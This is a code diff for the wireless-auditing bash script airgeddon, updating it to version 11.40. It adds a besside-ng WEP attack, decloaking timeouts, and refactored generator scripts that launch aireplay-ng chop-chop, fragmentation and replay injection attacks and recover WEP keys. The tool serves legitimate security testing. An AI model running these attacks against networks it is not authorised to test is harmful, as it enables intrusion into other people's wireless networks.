@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 11.31
+#Version......: 11.40
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -73,6 +73,7 @@ optional_tools_names=(
 						"hcxdumptool"
 						"tshark"
 						"tcpdump"
+						"besside-ng"
 					)
 
 update_tools=("curl")
@@ -114,6 +115,7 @@ declare -A possible_package_names=(
 									[${optional_tools_names[24]}]="hcxdumptool" #hcxdumptool
 									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
 									[${optional_tools_names[26]}]="tcpdump" #tcpdump
+									[${optional_tools_names[27]}]="aircrack-ng" #besside-ng
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -123,12 +125,12 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="11.31"
-language_strings_expected_version="11.31-1"
+airgeddon_version="11.40"
+language_strings_expected_version="11.40-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
-timeout_capture_handshake="20"
+timeout_capture_handshake_decloak="20"
 timeout_capture_pmkid="15"
 osversionfile_dir="/etc/"
 plugins_dir="plugins/"
@@ -188,9 +190,10 @@ jtr_output_file="${jtr_tmp_simple_name_file}.out"
 #WEP vars
 wep_data="wepdata"
 wepdir="wep/"
-wep_attack_file="ag.wep.sh"
+wep_attack_file="ag.wepattack.sh"
 wep_key_handler="ag.wep_key_handler.sh"
 wep_processes_file="wep_processes"
+wep_besside_log="ag.besside.log"
 
 #Docker vars
 docker_based_distro="Kali"
@@ -349,22 +352,22 @@ sponsors=(
 		)
 
 #Hint vars
-declare main_hints=(128 134 163 437 438 442 445 516 590 626 660 697 699 712)
+declare main_hints=(128 134 163 437 438 442 445 516 590 626 660 697 699 712 739)
 declare dos_hints=(129 131 133 697 699)
-declare handshake_pmkid_hints=(127 130 132 664 665 697 699)
-declare dos_handshake_hints=(142 697 699)
+declare handshake_pmkid_decloaking_hints=(127 130 132 664 665 697 699 728 729)
+declare dos_handshake_decloak_hints=(142 697 699 733 739)
 declare decrypt_hints=(171 179 208 244 163 697 699)
 declare personal_decrypt_hints=(171 178 179 208 244 163 697 699)
 declare enterprise_decrypt_hints=(171 179 208 244 163 610 697 699)
-declare select_interface_hints=(246 697 699 712)
+declare select_interface_hints=(246 697 699 712 739)
 declare language_hints=(250 438)
 declare option_hints=(445 250 448 477 591 626 697 699)
-declare evil_twin_hints=(254 258 264 269 309 328 400 509 697 699)
+declare evil_twin_hints=(254 258 264 269 309 328 400 509 697 699 739)
 declare evil_twin_dos_hints=(267 268 509 697 699)
 declare beef_hints=(408)
-declare wps_hints=(342 343 344 356 369 390 490 625 697 699)
-declare wep_hints=(431 429 428 432 433 697 699)
-declare enterprise_hints=(112 332 483 518 629 301 697 699)
+declare wps_hints=(342 343 344 356 369 390 490 625 697 699 739)
+declare wep_hints=(431 429 428 432 433 697 699 739)
+declare enterprise_hints=(112 332 483 518 629 301 697 699 739)
 
 #Charset vars
 crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
@@ -785,7 +788,7 @@ function generate_dynamic_line() {
 
 	local type=${2}
 	if [ "${type}" = "title" ]; then
-		if [ "${FUNCNAME[2]}" = "main_menu" ]; then
+		if [[ "${FUNCNAME[2]}" = "main_menu" ]] || [[ "${FUNCNAME[2]}" = "main_menu_override" ]]; then
 			ncharstitle=91
 		else
 			ncharstitle=78
@@ -2493,7 +2496,7 @@ function dos_pursuit_mode_et_handler() {
 	if [ "${yesno}" = "y" ]; then
 		dos_pursuit_mode=1
 
-		if [ "${et_dos_attack}" = "Wds Confusion" ]; then
+		if [ "${et_dos_attack}" = "Auth DoS" ]; then
 			echo
 			language_strings "${language}" 508 "yellow"
 			language_strings "${language}" 115 "read"
@@ -3076,9 +3079,9 @@ function read_timeout() {
 			min_max_timeout="25-2400"
 			timeout_shown="${timeout_secs_per_pixiedust}"
 		;;
-		"capture_handshake")
+		"capture_handshake_decloak")
 			min_max_timeout="10-100"
-			timeout_shown="${timeout_capture_handshake}"
+			timeout_shown="${timeout_capture_handshake_decloak}"
 		;;
 		"capture_pmkid")
 			min_max_timeout="10-100"
@@ -3102,7 +3105,7 @@ function ask_timeout() {
 		"wps_pixiedust")
 			local regexp="^2[5-9]$|^[3-9][0-9]$|^[1-9][0-9]{2}$|^1[0-9]{3}$|^2[0-3][0-9]{2}$|^2400$|^$"
 		;;
-		"capture_handshake")
+		"capture_handshake_decloak")
 			local regexp="^[1-9][0-9]$|^100$|^$"
 		;;
 		"capture_pmkid")
@@ -3123,8 +3126,8 @@ function ask_timeout() {
 			"wps_pixiedust")
 				timeout=${timeout_secs_per_pixiedust}
 			;;
-			"capture_handshake")
-				timeout=${timeout_capture_handshake}
+			"capture_handshake_decloak")
+				timeout=${timeout_capture_handshake_decloak}
 			;;
 			"capture_pmkid")
 				timeout=${timeout_capture_pmkid}
@@ -3140,15 +3143,39 @@ function ask_timeout() {
 		"wps_pixiedust")
 			timeout_secs_per_pixiedust=${timeout}
 		;;
-		"capture_handshake")
-			timeout_capture_handshake=${timeout}
+		"capture_handshake_decloak")
+			timeout_capture_handshake_decloak=${timeout}
 		;;
 		"capture_pmkid")
-				timeout_capture_pmkid=${timeout}
-			;;
+			timeout_capture_pmkid=${timeout}
+		;;
 	esac
 
 	language_strings "${language}" 391 "blue"
+}
+
+#Handle the proccess of checking decloak capture
+function decloak_check() {
+
+	debug_print
+
+	local time_counter=0
+	while true; do
+		sleep 5
+		if check_essid_in_capture_file; then
+			break
+		fi
+
+		time_counter=$((time_counter + 5))
+		if [ "${time_counter}" -ge "${timeout_capture_handshake_decloak}" ]; then
+			break
+		fi
+	done
+
+	kill "${processiddecloak}" &> /dev/null
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		tmux kill-window -t "${session_name}:Decloaking"
+	fi
 }
 
 #Handle the proccess of checking handshake capture
@@ -3164,7 +3191,7 @@ function handshake_capture_check() {
 		fi
 
 		time_counter=$((time_counter + 5))
-		if [ "${time_counter}" -ge "${timeout_capture_handshake}" ]; then
+		if [ "${time_counter}" -ge "${timeout_capture_handshake_decloak}" ]; then
 			break
 		fi
 	done
@@ -3535,6 +3562,27 @@ function validate_network_encryption_type() {
 	return 0
 }
 
+#Execute wep besside attack
+#shellcheck disable=SC2164
+function exec_wep_besside_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 4 "read"
+
+	prepare_wep_attack "besside"
+
+	recalculate_windows_sizes
+	pushd "${tmpdir}" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g2_stdleft_window} -T \"WEP Besside-ng attack\"" "besside-ng -c \"${channel}\" -b \"${bssid}\" \"${interface}\" -v | tee \"${tmpdir}${wep_besside_log}\"" "WEP Besside-ng attack" "active"
+	wait_for_process "besside-ng -c \"${channel}\" -b \"${bssid//:/ }\" \"${interface}\" -v" "WEP Besside-ng attack"
+	popd "${tmpdir}" > /dev/null 2>&1
+
+	manage_wep_besside_pot
+}
+
 #Execute wep all-in-one attack
 #shellcheck disable=SC2164
 function exec_wep_allinone_attack() {
@@ -3545,7 +3593,7 @@ function exec_wep_allinone_attack() {
 	language_strings "${language}" 296 "yellow"
 	language_strings "${language}" 115 "read"
 
-	prepare_wep_attack
+	prepare_wep_attack "allinone"
 	set_wep_script
 
 	recalculate_windows_sizes
@@ -3578,23 +3626,31 @@ function kill_wep_windows() {
 	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
 		kill "${item}" &> /dev/null
 	done
+
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 		kill_tmux_windows
 	fi
 }
 
-#Prepare wep attack deleting temp files
+#Prepare wep attacks deleting temp files
 function prepare_wep_attack() {
 
 	debug_print
 
-	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
-	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+	if [ "${1}" = "allinone" ]; then
+		rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
+		rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
+	else
+		rm -rf "${tmpdir}${wep_besside_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}wep.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}wps.cap" > /dev/null 2>&1
+		rm -rf "${tmpdir}besside.log" > /dev/null 2>&1
+	fi
 }
 
-#Create here-doc bash script used for key handling on wep all-in-one attack
+#Create here-doc bash script used for key handling on wep all-in-one and besside attacks
 function set_wep_key_script() {
 
 	debug_print
@@ -3603,11 +3659,10 @@ function set_wep_key_script() {
 
 	cat >&8 <<-EOF
 		#!/usr/bin/env bash
+
 		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
-	EOF
 
-	cat >&8 <<-EOF
-
+		#Function to launch window using xterm/tmux
 		function manage_output() {
 
 			xterm_parameters="\${1}"
@@ -3636,6 +3691,7 @@ function set_wep_key_script() {
 			esac
 		}
 
+		#Start supporting scripts inside its own tmux window
 		function start_tmux_processes() {
 
 			window_name="\${1}"
@@ -3658,33 +3714,20 @@ function set_wep_key_script() {
 			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
 			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
 		}
-	EOF
 
-	cat >&8 <<-EOF
 		wep_key_found=0
 
 		#Check if the wep password was captured and manage to save it on a file
-		function manage_wep_pot() {
+		function manage_wep_allinone_pot() {
 
 			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
 				wep_hex_key_cmd="cat \"${tmpdir}${wepdir}wepkey.txt\""
-	EOF
+				wep_hex_key=\$(eval "\${wep_hex_key_cmd}")
+				wep_ascii_key=\$(echo "\${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')
 
-	cat >&8 <<-'EOF'
-				wep_hex_key=$(eval "${wep_hex_key_cmd}")
-				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9A-Fa-f]{2}')
-	EOF
-
-	cat >&8 <<-EOF
 				echo "" > "${weppotenteredpath}"
 				{
-	EOF
-
-	cat >&8 <<-'EOF'
 				date +%Y-%m-%d
-	EOF
-
-	cat >&8 <<-EOF
 				echo -e "${wep_texts[${language},1]}"
 				echo ""
 				echo -e "BSSID: ${bssid}"
@@ -3693,25 +3736,9 @@ function set_wep_key_script() {
 				echo ""
 				echo "---------------"
 				echo ""
-	EOF
-
-	cat >&8 <<-'EOF'
-				echo -e "ASCII: ${wep_ascii_key}"
-	EOF
-
-	cat >&8 <<-EOF
+				echo -e "ASCII: \${wep_ascii_key}"
 				echo -en "${wep_texts[${language},3]}:"
-	EOF
-
-	cat >&8 <<-'EOF'
-				echo -en " ${wep_hex_key}"
-				echo ""
-	EOF
-
-	cat >&8 <<-EOF
-				} >> "${weppotenteredpath}"
-
-				{
+				echo -e " \${wep_hex_key}"
 				echo ""
 				echo "---------------"
 				echo ""
@@ -3724,11 +3751,8 @@ function set_wep_key_script() {
 		function kill_wep_script_windows() {
 
 			readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
-	EOF
-
-	cat >&8 <<-'EOF'
-			for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
-				kill "${item}" &> /dev/null
+			for item in "\${WEP_PROCESSES_TO_KILL[@]}"; do
+				kill "\${item}" &> /dev/null
 			done
 		}
 	EOF
@@ -3764,21 +3788,17 @@ function set_wep_key_script() {
 				wep_key_found=1
 				break
 			fi
-	EOF
 
-	cat >&8 <<-'EOF'
-			wep_script_alive=$(ps uax | awk '{print $2}' | grep -E "^${1}$" 2> /dev/null)
-			if [ -z "${wep_script_alive}" ]; then
+			wep_script_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${1}$" 2> /dev/null)
+			if [ -z "\${wep_script_alive}" ]; then
 				break
 			fi
 		done
 
-		if [ "${wep_key_found}" -eq 1 ]; then
-			manage_wep_pot
+		if [ "\${wep_key_found}" -eq 1 ]; then
+			manage_wep_allinone_pot
 		fi
-	EOF
 
-	cat >&8 <<-EOF
 		kill_wep_script_windows
 	EOF
 
@@ -3791,34 +3811,16 @@ function set_wep_key_script() {
 	cat >&8 <<-EOF
 		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
 		touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
-	EOF
-
-	cat >&8 <<-'EOF'
-		if [ "${wep_key_found}" -eq 1 ]; then
-	EOF
-
-	cat >&8 <<-EOF
+		if [ "\${wep_key_found}" -eq 1 ]; then
 			wep_key_cmd="echo -e '\t${yellow_color}${wep_texts[${language},5]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${wep_texts[${language},2]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}'"
 			wep_key_cmd+="&& echo"
 			wep_key_cmd+="&& echo -e '\t${blue_color}${wep_texts[${language},4]}${normal_color}'"
 			wep_key_cmd+="&& echo"
 			wep_key_cmd+="&& echo -en '\t${blue_color}ASCII: ${normal_color}'"
-	EOF
-
-	cat >&8 <<-'EOF'
-			wep_key_cmd+="&& echo -en '${wep_ascii_key}'"
-	EOF
-
-	cat >&8 <<-EOF
+			wep_key_cmd+="&& echo -en '\${wep_ascii_key}'"
 			wep_key_cmd+="&& echo"
 			wep_key_cmd+="&& echo -en '\t${blue_color}${wep_texts[${language},3]}: ${normal_color}'"
-	EOF
-
-	cat >&8 <<-'EOF'
-			wep_key_cmd+="&& echo -en '${wep_hex_key}'"
-	EOF
-
-	cat >&8 <<-EOF
+			wep_key_cmd+="&& echo -en '\${wep_hex_key}'"
 			wep_key_cmd+="&& echo"
 			wep_key_cmd+="&& echo"
 			wep_key_cmd+="&& echo -e '\t${pink_color}${wep_texts[${language},6]}: [${normal_color}${weppotenteredpath}${pink_color}]${normal_color}'"
@@ -3832,7 +3834,7 @@ function set_wep_key_script() {
 
 	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
 		cat >&8 <<-EOF
-			wep_key_window_pid=\$!
+			wep_key_window_pid="\$!"
 			{
 				echo -e "\${wep_key_window_pid}"
 			} >> "${tmpdir}${wepdir}${wep_processes_file}"
@@ -3855,9 +3857,11 @@ function set_wep_script() {
 
 	cat >&6 <<-EOF
 		#!/usr/bin/env bash
+
 		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
 		global_process_pid=""
 
+		#Function to launch window using xterm/tmux
 		function manage_output() {
 
 			xterm_parameters="\${1}"
@@ -3886,6 +3890,7 @@ function set_wep_script() {
 			esac
 		}
 
+		#Start supporting scripts inside its own tmux window
 		function start_tmux_processes() {
 
 			window_name="\${1}"
@@ -3899,17 +3904,20 @@ function set_wep_script() {
 					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
 				;;
 			esac
+
 			local tmux_color_cmd
 			if [ -n "\${3}" ]; then
 				tmux_color_cmd="bg=#000000 fg=\${3}"
 			else
 				tmux_color_cmd="bg=#000000"
 			fi
+
 			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
 			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
 		}
 
 		#Function to capture PID of a process started inside tmux and setting it to a global variable
+		#shellcheck disable=SC2009
 		function get_tmux_process_id() {
 
 			local process_pid
@@ -3923,166 +3931,125 @@ function set_wep_script() {
 
 		#Function to kill tmux windows using window name
 		function kill_tmux_window_by_name() {
+
 			if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				tmux kill-window -t "${session_name}:\${1}" 2> /dev/null
 			fi
 		}
 
-		#shellcheck disable=SC1037,SC2164,SC2140
 		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
+		#shellcheck disable=SC2164
 		cd "${tmpdir}${wepdir}" > /dev/null 2>&1
-	EOF
 
-	cat >&6 <<-'EOF'
 		#Execute wep chop-chop attack on its different phases
 		function wep_chopchop_attack() {
 
-			case ${wep_chopchop_phase} in
+			case "\${wep_chopchop_phase}" in
 				1)
-	EOF
-
-	cat >&6 <<-EOF
 					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
-	EOF
-
-	cat >&6 <<-'EOF'
 						wep_chopchop_phase=2
 					else
-						wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase1_pid}$" 2> /dev/null)
-						if [[ "${wep_chopchop_launched}" -eq 0 ]] || [[ -z "${wep_chopchop_phase1_pid_alive}" ]]; then
+						wep_chopchop_phase1_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase1_pid}$" 2> /dev/null)
+						if [[ "\${wep_chopchop_launched}" -eq 0 ]] || [[ -z "\${wep_chopchop_phase1_pid_alive}" ]]; then
 							wep_chopchop_launched=1
-	EOF
+							manage_output "+j -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
 
-	cat >&6 <<-EOF
-							manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
 							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
 								wep_chopchop_phase1_pid="\${global_process_pid}"
 								global_process_pid=""
 							else
-								wep_chopchop_phase1_pid=\$!
+								wep_chopchop_phase1_pid="\$!"
 							fi
-	EOF
 
-	cat >&6 <<-'EOF'
-							wep_script_processes+=(${wep_chopchop_phase1_pid})
+							wep_script_processes+=("\${wep_chopchop_phase1_pid}")
 						fi
 					fi
 				;;
 				2)
-	EOF
-
-	cat >&6 <<-EOF
 					kill_tmux_window_by_name "Chop-Chop Attack (1/3)"
-					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+					manage_output "+j -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+
 					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-						wep_chopchop_phase2_pid=\$!
+						wep_chopchop_phase2_pid="\$!"
 					fi
-	EOF
 
-	cat >&6 <<-'EOF'
-						wep_script_processes+=(${wep_chopchop_phase2_pid})
-						wep_chopchop_phase=3
+					wep_script_processes+=("\${wep_chopchop_phase2_pid}")
+					wep_chopchop_phase=3
 					;;
-					3)
-						wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
-	EOF
+				3)
+					wep_chopchop_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_chopchop_phase2_pid}$" 2> /dev/null)
+					if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
+						kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
+						manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
 
-	cat >&6 <<-EOF
-						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
-							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
-							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
-							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
-								wep_script_processes+=("\${global_process_pid}")
-								global_process_pid=""
-							else
-								wep_script_processes+=(\$!)
-							fi
-	EOF
-
-	cat >&6 <<-'EOF'
-							wep_chopchop_phase=4
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+							wep_script_processes+=("\${global_process_pid}")
+							global_process_pid=""
+						else
+							wep_script_processes+=("\$!")
 						fi
-					;;
+
+						wep_chopchop_phase=4
+					fi
+				;;
 			esac
 			write_wep_processes
 		}
-	EOF
 
-	cat >&6 <<-EOF
 		#Execute wep fragmentation attack on its different phases
 		function wep_fragmentation_attack() {
-	EOF
 
-	cat >&6 <<-'EOF'
-			case ${wep_fragmentation_phase} in
+			case "\${wep_fragmentation_phase}" in
 				1)
-	EOF
-
-	cat >&6 <<-EOF
 					if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
-	EOF
-
-	cat >&6 <<-'EOF'
 						wep_fragmentation_phase=2
 					else
-						wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase1_pid}$" 2> /dev/null)
-						if [[ "${wep_fragmentation_launched}" -eq 0 ]] || [[ -z "${wep_fragmentation_phase1_pid_alive}" ]]; then
+						wep_fragmentation_phase1_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fragmentation_phase1_pid}$" 2> /dev/null)
+						if [[ "\${wep_fragmentation_launched}" -eq 0 ]] || [[ -z "\${wep_fragmentation_phase1_pid_alive}" ]]; then
 							wep_fragmentation_launched=1
-	EOF
+							manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
 
-	cat >&6 <<-EOF
-							manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
 							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 								get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
 								wep_fragmentation_phase1_pid="\${global_process_pid}"
 								global_process_pid=""
 							else
-								wep_fragmentation_phase1_pid=\$!
+								wep_fragmentation_phase1_pid="\$!"
 							fi
-	EOF
 
-	cat >&6 <<-'EOF'
-							wep_script_processes+=(${wep_fragmentation_phase1_pid})
+							wep_script_processes+=("\${wep_fragmentation_phase1_pid}")
 						fi
 					fi
 				;;
 				2)
-	EOF
+					kill_tmux_window_by_name "Fragmentation Attack (1/3)"
+					manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
 
-	cat >&6 <<-EOF
-						kill_tmux_window_by_name "Fragmentation Attack (1/3)"
-						manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
-						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
-							wep_fragmentation_phase2_pid=\$!
-						fi
-	EOF
+					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+						wep_fragmentation_phase2_pid="\$!"
+					fi
 
-	cat >&6 <<-'EOF'
 					wep_fragmentation_phase=3
-					wep_script_processes+=(${wep_fragmentation_phase2_pid})
+					wep_script_processes+=("\${wep_fragmentation_phase2_pid}")
 				;;
 				3)
-					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
-	EOF
-
-	cat >&6 <<-EOF
+					wep_fragmentation_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fragmentation_phase2_pid}$" 2> /dev/null)
 					if [[ -z "\${wep_fragmentation_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}fragmentation.cap" ]]; then
 						kill_tmux_window_by_name "Fragmentation Attack (2/3)"
 						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
+
 						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
 							wep_script_processes+=("\${global_process_pid}")
 							global_process_pid=""
 						else
-							wep_script_processes+=(\$!)
+							wep_script_processes+=("\$!")
 						fi
-	EOF
 
-	cat >&6 <<-'EOF'
-							wep_fragmentation_phase=4
+						wep_fragmentation_phase=4
 					fi
 				;;
 			esac
@@ -4091,49 +4058,33 @@ function set_wep_script() {
 
 		#Write on a file the id of the WEP attack processes
 		function write_wep_processes() {
-	EOF
 
-	cat >&6 <<-EOF
 			if [ ! -f "${tmpdir}${wepdir}${wep_processes_file}" ]; then
 				touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
 			fi
 			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"
-	EOF
 
-	cat >&6 <<-'EOF'
-			for item in "${wep_script_processes[@]}"; do
-				grep -E "^${item}$" "${path_to_process_file}" > /dev/null 2>&1
-	EOF
-
-	cat >&6 <<-'EOF'
-				if [ "$?" != "0" ]; then
-					echo "${item}" >>\
-	EOF
-
-	cat >&6 <<-EOF
-					"${tmpdir}${wepdir}${wep_processes_file}"
+			for item in "\${wep_script_processes[@]}"; do
+				if ! grep -E "^\${item}$" "\${path_to_process_file}" > /dev/null 2>&1; then
+					echo "\${item}" >> "${tmpdir}${wepdir}${wep_processes_file}"
 				fi
 			done
 		}
 
 		wep_script_processes=()
 
-		manage_output "-bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
+		manage_output "+j -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
 		if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
 			wep_script_capture_pid="\${global_process_pid}"
 			global_process_pid=""
 		else
-			wep_script_capture_pid=\$!
+			wep_script_capture_pid="\$!"
 		fi
-	EOF
 
-	cat >&6 <<-'EOF'
-		wep_script_processes+=(${wep_script_capture_pid})
+		wep_script_processes+=("\${wep_script_capture_pid}")
 		write_wep_processes
-	EOF
 
-	cat >&6 <<-EOF
 		wep_to_be_launched_only_once=0
 		wep_fakeauth_pid=""
 		wep_aircrack_launched=0
@@ -4142,39 +4093,30 @@ function set_wep_script() {
 		wep_chopchop_phase=1
 		wep_fragmentation_launched=0
 		wep_fragmentation_phase=1
-	EOF
 
-	cat >&6 <<-'EOF'
 		while true; do
